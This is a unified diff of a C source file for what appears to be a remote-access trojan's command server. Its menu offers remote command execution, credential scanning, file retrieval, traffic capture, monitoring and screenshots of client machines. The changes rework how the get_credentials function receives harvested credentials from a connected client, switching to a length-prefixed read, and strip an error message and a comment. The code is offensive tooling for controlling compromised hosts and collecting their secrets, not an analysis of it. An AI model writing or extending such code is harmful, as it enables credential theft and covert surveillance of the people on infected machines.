@@ -13,7 +13,7 @@
 #define PORT 8080
 #define BUFFER_SIZE 1024*10
 
-char options[]="Choose an option:\n 1. Execute commands\n 2. Scan for credentials\n 3. Get system info\n 4. Retrieve file\n 5. Capture traffic\n 6. Monitor the system \n 7.Screenshot the System \n 8. Return to clients menu ";
+char options[]="Choose an option:\n 1. Execute commands\n 2. Scan for credentials\n 3. Get system info\n 4. Retrieve file\n 5. Capture traffic\n 6. Monitor the system \n 7. Screenshot the System \n 8. Return to clients menu ";
 
 typedef struct client
 {   
@@ -94,28 +94,22 @@ void get_credentials(int clientfd)
 
     sys_info[0]=0;
 
-    sleep(2);
-
+    int expected_size=0;
+    int temp;
+    recv(clientfd,&temp,sizeof(int),0);
+    expected_size=ntohl(temp);
+    printf("astept %d\n",expected_size);
     while ((bytes_read = read(clientfd, buffer, sizeof(buffer) - 1)) > 0) 
     {
         buffer[bytes_read] = '\0'; 
-        char *end_marker = strstr(buffer, "<END_OF_DATA>");
-        if (end_marker != NULL) 
-        {
-            *end_marker = '\0';
-            strcat(sys_info, buffer);
-            myWrite("Credentials from client: \n",STDOUT_FILENO);
-            myWrite(sys_info,STDOUT_FILENO);
-            break; 
-        }   
         strcat(sys_info, buffer);
         total_bytes_read += bytes_read;
-        if (total_bytes_read >= sizeof(sys_info) - 1) 
+        if(total_bytes_read==expected_size)
         {
-            myWrite("Buffer limit reached, cannot read further data.\n",STDOUT_FILENO);
-            break;
+            printf("%s\n",sys_info);
+            return;
         }
-        }
+    }
 
     if (total_bytes_read == 0) 
     {
@@ -153,11 +147,6 @@ void get_system_info(int clientfd)
             break;
         }
         }
-
-    if (total_bytes_read == 0) 
-    {
-        myWrite("Failed to receive system information from client or connection closed.\n",STDOUT_FILENO);
-    }
 }
 
 void screenshot_system(int clientfd)
@@ -421,7 +410,7 @@ void* client_interaction_thread(void* args) {
         pthread_mutex_unlock(&active_client_mutex);
 
         if (client_id < 0) {
-            sleep(1); // Niciun client selectat, așteaptă
+            sleep(1); 
             continue;
         }
 
